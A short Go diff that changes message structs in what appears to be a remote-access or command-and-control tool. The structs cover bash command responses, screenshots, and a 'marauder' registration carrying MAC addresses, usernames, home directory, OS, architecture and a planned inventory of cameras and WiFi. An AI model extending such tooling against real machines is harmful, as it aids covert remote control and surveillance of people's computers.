@@ -66,7 +66,7 @@ type BashResponse struct {
 }
 
 // ==================================================
-// Response of shell command execution
+// Response of screenshot command execution
 // ==================================================
 type ScreenshotNotification struct {
 	ResponseHeaders
@@ -81,14 +81,16 @@ type ScreenshotNotification struct {
 // @os: marauder operating system
 // @machineusers: list of users in the machine
 // @installationdate: date of the installation of the OS YYYY-MM-DD
-// TODO: add devices info (cameras, keyboards, mouses, number of screens, harddrives, WiFi info, programs installed)
+// TODO: add devices info (cameras, keyboards, mouses, number of screens, harddrives, WiFi info) and programs installed
 type MarauderRegistrationRequest struct {
 	Action             string   `json:"action"`
-	Macaddress         string   `json:"macaddress"`
+	Macaddresses       []string `json:"macaddresses"`
 	Devicetype         string   `json:"devicetype"`
 	Devicename         string   `json:"devicename"`
 	Username           string   `json:"username"`
+	Userhomedir        string   `json:"userhomedir"`
 	Os                 string   `json:"os"`
+	Arch               string   `json:"arch"`
 	Machineusers       []string `json:"machineusers"`
 	OsInstallationdate string   `json:"osinstallationdate"`
 }
